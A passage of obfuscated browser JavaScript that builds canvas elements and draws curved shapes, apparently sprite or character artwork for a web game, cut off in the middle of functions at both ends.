			Δ.bezierCurveTo(ⲆᐃⲆΔⲆΔⲆ * ᐃ, ᐃ * 67, ⲆⵠⵠⵠⵠᐃΔ * ᐃ, 67 * ᐃ, ᐃ * 7, 59 * ᐃ);
			Δ.bezierCurveTo(14 * ᐃ, ᐃ * 59, ᐃ * ⲆΔᐃⲆΔᐃΔ, 59 * ᐃ, ᐃ * 21, ᐃ * 59);
			Δ.bezierCurveTo(46 * ᐃ, ᐃ * 35, 35 * ᐃ, 45 * ᐃ, 49 * ᐃ, ᐃ * 31);
			Δ.bezierCurveTo(ᐃ * 53, 24 * ᐃ, ᐃ * 51, 21 * ᐃ, ᐃ * 51, ᐃᐃΔⵠⵠⵠΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63, 23 * ᐃ, 63 * ᐃ, ᐃ * 24, ᐃ * 69, ᐃ * 29);
			Δ.bezierCurveTo(ᐃ * 76, ᐃ * ᐃⵠⲆᐃΔⵠᐃ, ᐃ * 75, ⲆᐃΔⵠⵠΔᐃ * ᐃ, 76 * ᐃ, ⵠᐃᐃΔΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 81, ⲆⲆΔΔⵠΔⲆ * ᐃ, ᐃ * 84, ⵠⲆᐃᐃΔᐃᐃ * ᐃ, 89 * ᐃ, 27 * ᐃ);
			Δ.bezierCurveTo(95 * ᐃ, ᐃ * 25, ⲆᐃᐃΔⵠᐃΔ * ᐃ, ᐃ * 16, ᐃ * 105, 14 * ᐃ);
			Δ.bezierCurveTo(103 * ᐃ, 25 * ᐃ, 111 * ᐃ, 33 * ᐃ, 110 * ᐃ, ᐃ * 34);
			Δ.bezierCurveTo(ᐃ * 123, 48 * ᐃ, ᐃ * 123, 48 * ᐃ, 136 * ᐃ, 62 * ᐃ);
			Δ.bezierCurveTo(142 * ᐃ, ᐃ * 60, ᐃ * 147, ᐃ * 59, 155 * ᐃ, 58 * ᐃ);
			Δ.bezierCurveTo(147 * ᐃ, 65 * ᐃ, 147 * ᐃ, ᐃ * 65, 139 * ᐃ, 73 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 145, 73 * ᐃ, 145 * ᐃ, ᐃ * 73, 151 * ᐃ, ᐃ * 73);
			Δ.bezierCurveTo(145 * ᐃ, 80 * ᐃ, 145 * ᐃ, ᐃ * 80, ᐃ * 138, 87 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 144, 88 * ᐃ, ᐃ * 144, 88 * ᐃ, 150 * ᐃ, ᐃ * 89);
			Δ.bezierCurveTo(125 * ᐃ, 103 * ᐃ, ᐃ * 125, ᐃ * 125, 113 * ᐃ, 141 * ᐃ);
			Δ.bezierCurveTo(92 * ᐃ, ᐃ * 178, ᐃ * 85, 177 * ᐃ, ᐃ * 76, ᐃ * 178);
			Δ.bezierCurveTo(64 * ᐃ, 179 * ᐃ, ᐃ * 51, ᐃ * 164, ᐃ * 35, ᐃ * 131);
			Δ.bezierCurveTo(ᐃ * ⵠⲆᐃᐃΔᐃᐃ, ᐃ * 95, ᐃ * ΔⵠⲆΔⲆⲆᐃ, 99 * ᐃ, ᐃ * 8, ᐃ * 93);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(28 * ᐃ, ᐃ * 63);
			Δ.bezierCurveTo(ᐃ * 23, ᐃ * 54, ᐃ * 24, 47 * ᐃ, ᐃ * 26, 37 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 28, ᐃ * 29, ᐃ * 31, 31 * ᐃ, 41 * ᐃ, 35 * ᐃ);
			Δ.bezierCurveTo(52 * ᐃ, 45 * ᐃ, ᐃ * 55, ᐃ * 51, ᐃ * 57, 53 * ᐃ);
			Δ.bezierCurveTo(50 * ᐃ, 50 * ᐃ, 44 * ᐃ, ᐃ * 47, 43 * ᐃ, 48 * ᐃ);
			Δ.bezierCurveTo(43 * ᐃ, 52 * ᐃ, ᐃ * 43, 52 * ᐃ, ᐃ * 42, 57 * ᐃ);
			Δ.bezierCurveTo(38 * ᐃ, 54 * ᐃ, ᐃ * 38, ᐃ * 54, ᐃ * 33, ᐃ * 51);
			Δ.bezierCurveTo(ᐃ * 34, ᐃ * 56, ᐃ * 34, 56 * ᐃ, ᐃ * 34, ᐃ * 61);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 99, 55 * ᐃ);
			Δ.bezierCurveTo(107 * ᐃ, 43 * ᐃ, 113 * ᐃ, ᐃ * 39, 121 * ᐃ, ᐃ * 34);
			Δ.bezierCurveTo(130 * ᐃ, 29 * ᐃ, ᐃ * 130, 34 * ᐃ, 130 * ᐃ, ᐃ * 42);
			Δ.bezierCurveTo(131 * ᐃ, ᐃ * 57, ᐃ * 128, 61 * ᐃ, 129 * ᐃ, 63 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124, 62 * ᐃ, ᐃ * 124, 62 * ᐃ, ᐃ * 119, ᐃ * 61);
			Δ.bezierCurveTo(ᐃ * 119, 56 * ᐃ, ᐃ * 120, ᐃ * 61, 118 * ᐃ, 52 * ᐃ);
			Δ.bezierCurveTo(115 * ᐃ, 55 * ᐃ, 111 * ᐃ, 59 * ᐃ, 111 * ᐃ, ᐃ * 58);
			Δ.bezierCurveTo(110 * ᐃ, 54 * ᐃ, 109 * ᐃ, 57 * ᐃ, 109 * ᐃ, 51 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			ⵠᐃᐃ(Δ, 103 * ᐃ, ᐃ * 110, ΔⲆΔⵠⲆⵠⲆ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃΔ]);
			ⵠᐃᐃ(Δ, ᐃ * 55, ᐃ * 111, ᐃ * ⵠⲆᐃⵠⲆᐃΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆΔ]);
			ⵠᐃᐃ(Δ, ᐃ * 99, 107 * ᐃ, 5 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ]);
			ⵠᐃᐃ(Δ, 51 * ᐃ, ᐃ * 108, ᐃ * ᐃΔΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 31, ᐃ * 121);
			Δ.bezierCurveTo(45 * ᐃ, ᐃ * 128, ᐃ * 51, 133 * ᐃ, 53 * ᐃ, ᐃ * 141);
			Δ.bezierCurveTo(59 * ᐃ, 161 * ᐃ, ᐃ * 70, ᐃ * 173, 80 * ᐃ, ᐃ * 169);
			Δ.bezierCurveTo(89 * ᐃ, 172 * ᐃ, ᐃ * 99, ᐃ * 149, ᐃ * 107, ᐃ * 133);
			Δ.bezierCurveTo(ᐃ * 114, 122 * ᐃ, ᐃ * 119, 123 * ᐃ, ᐃ * 124, ᐃ * 119);
			Δ.bezierCurveTo(109 * ᐃ, ᐃ * 148, ᐃ * 117, ᐃ * 133, ᐃ * 109, 147 * ᐃ);
			Δ.bezierCurveTo(87 * ᐃ, ᐃ * 180, 84 * ᐃ, 179 * ᐃ, ᐃ * 76, ᐃ * 178);
			Δ.bezierCurveTo(ᐃ * 49, 173 * ᐃ, ᐃ * 44, 149 * ᐃ, ᐃ * 31, 121 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.translate(-ΔⵠⵠΔ, 0);
			Δ.moveTo(ᐃ * 71, 162 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 80, 155 * ᐃ, ᐃ * 85, ᐃ * 159, ᐃ * 89, ᐃ * 164);
			Δ.bezierCurveTo(90 * ᐃ, ᐃ * 171, 86 * ᐃ, ᐃ * 173, ᐃ * 79, ᐃ * 173);
			Δ.bezierCurveTo(67 * ᐃ, ᐃ * 172, 67 * ᐃ, 168 * ᐃ, 71 * ᐃ, 162 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.translate(2, 0);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * 9, 93 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 17, 95 * ᐃ, ΔΔⵠΔⲆ * ᐃ, 95 * ᐃ, 21 * ᐃ, 95 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ΔΔⵠⲆⵠ, 83 * ᐃ, ᐃ * 17, ᐃ * 93, ᐃ * Ⲇᐃⵠᐃ, ᐃ * 76);
			Δ.bezierCurveTo(ᐃ * ⵠᐃⲆΔᐃᐃᐃ, ᐃ * 75, 11 * ᐃ, 75 * ᐃ, ᐃ * ⵠⲆᐃᐃΔᐃᐃ, 75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 13, 67 * ᐃ, 13 * ᐃ, 67 * ᐃ, ᐃ * ⲆᐃᐃᐃΔ, ᐃ * 59);
			Δ.bezierCurveTo(ᐃ * 14, 59 * ᐃ, ᐃ * 14, 59 * ᐃ, ᐃ * 21, ᐃ * 59);
			Δ.bezierCurveTo(46 * ᐃ, ᐃ * 35, 35 * ᐃ, ᐃ * 45, 49 * ᐃ, 31 * ᐃ);
			Δ.bezierCurveTo(53 * ᐃ, ᐃ * 24, 51 * ᐃ, ᐃ * 21, 51 * ᐃ, ᐃ * ⵠΔⵠΔΔ);
			Δ.bezierCurveTo(63 * ᐃ, ᐃ * 23, 63 * ᐃ, 24 * ᐃ, ᐃ * 69, 29 * ᐃ);
			Δ.bezierCurveTo(76 * ᐃ, 7 * ᐃ, 75 * ᐃ, ᐃ * 11, 76 * ᐃ, ⵠⵠⵠⲆⲆ * ᐃ);
			Δ.bezierCurveTo(81 * ᐃ, ᐃ * 12, ᐃ * 84, ᐃᐃΔⲆⲆΔⲆ * ᐃ, 89 * ᐃ, 27 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 95, 25 * ᐃ, 100 * ᐃ, ᐃ * ᐃⲆⲆΔΔⵠΔ, ᐃ * 105, ᐃ * 14);
			Δ.bezierCurveTo(ᐃ * 103, ᐃ * 25, 111 * ᐃ, 33 * ᐃ, 110 * ᐃ, 34 * ᐃ);
			Δ.bezierCurveTo(123 * ᐃ, ᐃ * 48, ᐃ * 123, ᐃ * 48, 136 * ᐃ, 62 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 142, 60 * ᐃ, 147 * ᐃ, ᐃ * 59, ᐃ * 155, ᐃ * 58);
			Δ.bezierCurveTo(ᐃ * 147, 65 * ᐃ, 147 * ᐃ, ᐃ * 65, ᐃ * 139, 73 * ᐃ);
			Δ.bezierCurveTo(145 * ᐃ, 73 * ᐃ, ᐃ * 145, 73 * ᐃ, ᐃ * 151, 73 * ᐃ);
			Δ.bezierCurveTo(145 * ᐃ, ᐃ * 80, 145 * ᐃ, 80 * ᐃ, ᐃ * 138, ᐃ * 87);
			Δ.bezierCurveTo(144 * ᐃ, 88 * ᐃ, ᐃ * 144, ᐃ * 88, 150 * ᐃ, 89 * ᐃ);
			Δ.bezierCurveTo(125 * ᐃ, ᐃ * 103, ᐃ * 125, ᐃ * 125, 113 * ᐃ, 141 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 92, ᐃ * 178, 85 * ᐃ, ᐃ * 177, ᐃ * 76, 178 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 64, 179 * ᐃ, 51 * ᐃ, ᐃ * 164, 35 * ᐃ, 131 * ᐃ);
			Δ.bezierCurveTo(18 * ᐃ, 95 * ᐃ, ⵠΔΔⲆΔΔΔ * ᐃ, 99 * ᐃ, ᐃ * ΔⵠⲆᐃⲆ, ᐃ * 93);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔΔΔⲆ, Ⲇᐃ[ⵠⵠⵠΔ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(25 * ᐃ, ᐃ * 63);
			Δ.bezierCurveTo(ᐃ * 16, ᐃ * 58, ᐃ * 17, ᐃ * 51, ᐃ * ⵠᐃΔΔΔⲆⲆ, 33 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ΔΔⲆᐃⵠ, ᐃ * 12, ᐃ * 21, 12 * ᐃ, 32 * ᐃ, ᐃ * 17);
			Δ.bezierCurveTo(ᐃ * 63, 31 * ᐃ, 66 * ᐃ, ᐃ * 45, ᐃ * 66, 54 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⲆⵠᐃ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(91 * ᐃ, 53 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 91, ᐃ * 40, 98 * ᐃ, ᐃ * 33, 121 * ᐃ, ᐃ * 20);
			Δ.bezierCurveTo(ᐃ * 137, 12 * ᐃ, ᐃ * 137, ᐃⵠⲆⲆᐃⵠⵠ * ᐃ, ᐃ * 139, 27 * ᐃ);
			Δ.bezierCurveTo(141 * ᐃ, ᐃ * 49, ᐃ * 140, 57 * ᐃ, 134 * ᐃ, 64 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 31, ᐃ * 63);
			Δ.bezierCurveTo(ᐃ * 23, ᐃ * 54, 24 * ᐃ, ᐃ * 47, ᐃ * 26, ᐃ * 37);
			Δ.bezierCurveTo(28 * ᐃ, ᐃ * 29, 31 * ᐃ, 31 * ᐃ, 41 * ᐃ, ᐃ * 35);
			Δ.bezierCurveTo(52 * ᐃ, 45 * ᐃ, ᐃ * 55, 51 * ᐃ, 57 * ᐃ, 53 * ᐃ);
			Δ.bezierCurveTo(50 * ᐃ, 50 * ᐃ, 44 * ᐃ, 47 * ᐃ, ᐃ * 43, ᐃ * 48);
			Δ.bezierCurveTo(43 * ᐃ, ᐃ * 52, 43 * ᐃ, 52 * ᐃ, 42 * ᐃ, 57 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 38, ᐃ * 54, ᐃ * 38, 54 * ᐃ, 33 * ᐃ, 51 * ᐃ);
			Δ.bezierCurveTo(34 * ᐃ, ᐃ * 56, 34 * ᐃ, ᐃ * 56, 34 * ᐃ, 61 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(99 * ᐃ, 55 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 107, ᐃ * 43, ᐃ * 113, 39 * ᐃ, ᐃ * 121, ᐃ * 34);
			Δ.bezierCurveTo(ᐃ * 130, 29 * ᐃ, ᐃ * 130, ᐃ * 34, ᐃ * 130, 42 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 131, ᐃ * 57, 128 * ᐃ, ᐃ * 61, ᐃ * 129, ᐃ * 63);
			Δ.bezierCurveTo(ᐃ * 124, 62 * ᐃ, ᐃ * 124, ᐃ * 62, 119 * ᐃ, ᐃ * 61);
			Δ.bezierCurveTo(ᐃ * 119, 56 * ᐃ, ᐃ * 120, ᐃ * 61, ᐃ * 118, 52 * ᐃ);
			Δ.bezierCurveTo(115 * ᐃ, ᐃ * 55, 111 * ᐃ, ᐃ * 59, 111 * ᐃ, 58 * ᐃ);
			Δ.bezierCurveTo(110 * ᐃ, ᐃ * 54, ᐃ * 109, ᐃ * 57, ᐃ * 109, ᐃ * 51);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ]);
			return Ⲇⵠ
		}

		function ⲆⲆⵠⵠᐃΔⲆⲆⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 85;
			Ⲇⵠ.height = ᐃ * 145;
			Δ.translate(-ⲆⲆⲆⵠΔ * ᐃ, ᐃ * -95);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 50, ᐃ * 105);
			Δ.bezierCurveTo(ᐃ * 52, ᐃ * 119, 64 * ᐃ, 137 * ᐃ, 71 * ᐃ, ᐃ * 146);
			Δ.bezierCurveTo(71 * ᐃ, 161 * ᐃ, 74 * ᐃ, 169 * ᐃ, 79 * ᐃ, 179 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 68, 192 * ᐃ, 70 * ᐃ, 204 * ᐃ, ᐃ * 69, ᐃ * 216);
			Δ.bezierCurveTo(50 * ᐃ, ᐃ * 189.5, ᐃ * 50, ᐃ * 189.5, 31 * ᐃ, ᐃ * 163);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(44 * ᐃ, ᐃ * 106);
			Δ.bezierCurveTo(49 * ᐃ, ᐃ * 90, 58 * ᐃ, 104 * ᐃ, 51 * ᐃ, ᐃ * 121);
			Δ.bezierCurveTo(ᐃ * 45, 143 * ᐃ, 41 * ᐃ, ᐃ * 151, ᐃ * 37, ᐃ * 162);
			Δ.bezierCurveTo(ᐃ * 48, ᐃ * 180, ᐃ * 58, ᐃ * 188, 76 * ᐃ, 205 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 104, 209 * ᐃ, ᐃ * 105, ᐃ * 229, ᐃ * 92, ᐃ * 235);
			Δ.bezierCurveTo(76 * ᐃ, ᐃ * 239, ᐃ * 75, ᐃ * 232, 56 * ᐃ, ᐃ * 213);
			Δ.bezierCurveTo(31 * ᐃ, 187 * ᐃ, ᐃ * 28, 176 * ᐃ, ᐃ * 23, ᐃ * 162);
			Δ.bezierCurveTo(ᐃ * 38, ᐃ * 131, 40 * ᐃ, 120 * ᐃ, ᐃ * 44, ᐃ * 106);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ, Ⲇᐃ, ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(30 * ᐃ, ᐃ * 159);
			Δ.bezierCurveTo(ᐃ * 46, ᐃ * 157, 59 * ᐃ, ᐃ * 152, ᐃ * 68, ᐃ * 148);
			Δ.bezierCurveTo(ᐃ * 63, ᐃ * 155, 52 * ᐃ, 160 * ᐃ, ᐃ * 44, 164 * ᐃ);
			Δ.bezierCurveTo(59 * ᐃ, ᐃ * 169, ᐃ * 66, 174 * ᐃ, ᐃ * 75, 178 * ᐃ);
			Δ.bezierCurveTo(58 * ᐃ, ᐃ * 178, ᐃ * 49, 175 * ᐃ, ᐃ * 37, ᐃ * 174);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ);
			return Ⲇⵠ
		}

		function ⵠᐃⵠⲆᐃΔᐃⲆΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 271;
			Ⲇⵠ.height = 366 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(133 * ᐃ, ᐃ * 99);
			Δ.bezierCurveTo(186 * ᐃ, ᐃ * 123, ᐃ * 199, ᐃ * 152, 209 * ᐃ, ᐃ * 169);
			Δ.bezierCurveTo(228 * ᐃ, 205 * ᐃ, ᐃ * 224, 245 * ᐃ, 190 * ᐃ, 276 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 161, ᐃ * 296, ᐃ * 99, 292 * ᐃ, 79 * ᐃ, 274 * ᐃ);
			Δ.bezierCurveTo(49 * ᐃ, 253 * ᐃ, 47 * ᐃ, 214 * ᐃ, 50 * ᐃ, 197 * ᐃ);
			Δ.bezierCurveTo(61 * ᐃ, 143 * ᐃ, ᐃ * 102, ᐃ * 113, 131 * ᐃ, 99 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(73 * ᐃ, ᐃ * 270);
			Δ.bezierCurveTo(79 * ᐃ, 280 * ᐃ, 77 * ᐃ, 280 * ᐃ, ᐃ * 78, 287 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78, 290 * ᐃ, 83 * ᐃ, ᐃ * 291, ᐃ * 82, 299 * ᐃ);
			Δ.bezierCurveTo(81 * ᐃ, ᐃ * 301, 87 * ᐃ, ᐃ * 301, ᐃ * 92, 314 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 94, ᐃ * 319, ᐃ * 100, 321 * ᐃ, 107 * ᐃ, 320 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 111, ᐃ * 323, 114 * ᐃ, ᐃ * 324, ᐃ * 119, ᐃ * 320);
			Δ.bezierCurveTo(ᐃ * 137, 321 * ᐃ, 146 * ᐃ, ᐃ * 323, 139 * ᐃ, 320 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 141, 324 * ᐃ, 150 * ᐃ, 324 * ᐃ, ᐃ * 153, ᐃ * 320);
			Δ.bezierCurveTo(ᐃ * 168, 319 * ᐃ, 171 * ᐃ, 316 * ᐃ, 173 * ᐃ, 307 * ᐃ);
			Δ.bezierCurveTo(180 * ᐃ, 305 * ᐃ, 180 * ᐃ, 301 * ᐃ, 178 * ᐃ, 296 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 183, ᐃ * 296, ᐃ * 185, 289 * ᐃ, 188 * ᐃ, 279 * ᐃ);
			Δ.bezierCurveTo(171 * ᐃ, 286 * ᐃ, 149 * ᐃ, 290 * ᐃ, ᐃ * 132, ᐃ * 289);
			Δ.bezierCurveTo(ᐃ * 101, 290 * ᐃ, 86 * ᐃ, ᐃ * 280, 74 * ᐃ, ᐃ * 271);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 76, ᐃ * 252);
			Δ.bezierCurveTo(ᐃ * 85, 294 * ᐃ, 96 * ᐃ, ᐃ * 314, ᐃ * 103, ᐃ * 314);
			Δ.bezierCurveTo(106 * ᐃ, 316 * ᐃ, ᐃ * 151, 314 * ᐃ, 156 * ᐃ, ᐃ * 314);
			Δ.bezierCurveTo(ᐃ * 169, 317 * ᐃ, ᐃ * 182, 285 * ᐃ, 191 * ᐃ, ᐃⲆᐃⲆᐃⵠⲆ * ᐃ);
			Δ.bezierCurveTo(134.5 * ᐃ, ᐃ * 254, ᐃ * 134.5, ᐃ * 254, ᐃ * 78, 252 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(84 * ᐃ, ᐃ * 257);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 273, 146 * ᐃ, ᐃ * 268, 179 * ᐃ, ᐃ * 261);
			Δ.bezierCurveTo(ᐃ * 190, 258 * ᐃ, ᐃ * 187, ᐃ * 266, 178 * ᐃ, ᐃ * 272);
			Δ.bezierCurveTo(ᐃ * 160, ᐃ * 284, ᐃ * 123, ᐃ * 282, ΔᐃⵠⲆⲆ * ᐃ, ᐃ * 277);
			Δ.bezierCurveTo(73 * ᐃ, 260 * ᐃ, ᐃ * 79, 257 * ᐃ, 84 * ᐃ, ᐃ * 257);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 125, 65 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 133, ᐃ * 45, ᐃ * 136, ᐃ * 42, 141 * ᐃ, ᐃ * 55);
			Δ.bezierCurveTo(ᐃ * 151, ᐃ * 96, ᐃ * 164, ᐃ * 117, 175 * ᐃ, 134 * ᐃ);
			Δ.bezierCurveTo(203 * ᐃ, 181 * ᐃ, 207 * ᐃ, ᐃ * 182, ᐃ * 208, ᐃ * 215);
			Δ.bezierCurveTo(ᐃ * 206, 240 * ᐃ, 205 * ᐃ, ᐃ * 246, ᐃ * 184, ᐃ * 258);
			Δ.bezierCurveTo(ᐃ * 161, 267 * ᐃ, ᐃ * 131, ᐃ * 272, ᐃ * 86, ᐃ * 258);
			Δ.bezierCurveTo(67 * ᐃ, ᐃ * 252, ᐃ * 68, ᐃ * 239, ᐃ * 64, ᐃ * 216);
			Δ.bezierCurveTo(ᐃ * 62, 194 * ᐃ, 72 * ᐃ, ᐃ * 169, ᐃ * 92, 142 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106, ᐃ * 121, 114 * ᐃ, ᐃ * 101, 125 * ᐃ, 65 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(115 * ᐃ, ᐃ * 37);
			Δ.bezierCurveTo(ᐃ * 116, 28 * ᐃ, 119 * ᐃ, 27 * ᐃ, ᐃ * 126, ᐃ * 37);
			Δ.bezierCurveTo(134 * ᐃ, ᐃ * 48, 134 * ᐃ, 49 * ᐃ, ᐃ * 132, 59 * ᐃ);
			Δ.bezierCurveTo(131 * ᐃ, 67 * ᐃ, ᐃ * 127, 65 * ᐃ, 120 * ᐃ, ᐃ * 56);
			Δ.bezierCurveTo(ᐃ * 114, ᐃ * 49, ᐃ * 113, ᐃ * 43, 115 * ᐃ, 38 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(146 * ᐃ, ᐃ * 34);
			Δ.bezierCurveTo(152 * ᐃ, 28 * ᐃ, ᐃ * 155, ᐃ * 27, 157 * ᐃ, ᐃ * 39);
			Δ.bezierCurveTo(ᐃ * 157, 45 * ᐃ, ᐃ * 157, ᐃ * 49, 150 * ᐃ, ᐃ * 56);
			Δ.bezierCurveTo(141 * ᐃ, ᐃ * 66, ᐃ * 138, 66 * ᐃ, 138 * ᐃ, 57 * ᐃ);
			Δ.bezierCurveTo(137 * ᐃ, 50 * ᐃ, ᐃ * 137, 47 * ᐃ, 141 * ᐃ, ᐃ * 42);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 143, ᐃ * 69);
			Δ.bezierCurveTo(ᐃ * 148, ᐃ * 56, 156 * ᐃ, ᐃ * 50, ᐃ * 158, 58 * ᐃ);
			Δ.bezierCurveTo(159 * ᐃ, 64 * ᐃ, ᐃ * 160, ᐃ * 67, ᐃ * 153, ᐃ * 77);
			Δ.bezierCurveTo(ᐃ * 148, ᐃ * 83, 145 * ᐃ, ᐃ * 84, 143 * ᐃ, ᐃ * 77);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(149 * ᐃ, ᐃ * 92);
			Δ.bezierCurveTo(149 * ᐃ, ᐃ * 89, ᐃ * 151, ᐃ * 84, 156 * ᐃ, 79 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 161, 73 * ᐃ, 163 * ᐃ, 78 * ᐃ, ᐃ * 162, 86 * ᐃ);
			Δ.bezierCurveTo(161 * ᐃ, ᐃ * 91, ᐃ * 155, ᐃ * 99, ᐃ * 152, 98 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(111 * ᐃ, ᐃ * 61);
			Δ.bezierCurveTo(114 * ᐃ, 51 * ᐃ, 117 * ᐃ, ᐃ * 51, ᐃ * 124, 64 * ᐃ);
